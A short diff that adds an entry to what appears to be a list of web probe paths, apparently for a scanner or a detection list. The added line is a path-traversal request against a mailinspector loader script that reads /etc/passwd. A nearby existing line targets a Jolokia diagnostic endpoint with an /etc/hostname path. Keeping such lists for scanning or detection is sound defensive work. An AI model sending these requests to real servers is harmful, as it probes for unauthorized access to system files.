@@ -16,6 +16,7 @@ pagespeed_admin/statistics
 pagespeed_admin/config
 static/nexus-rapture-bundle.js
 pim/flower/api/workers
+mailinspector/public/loader.php?path=../../../../../../../etc/passwd
 CMSSiteUtils
 geoserver/ows
 actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/hostname
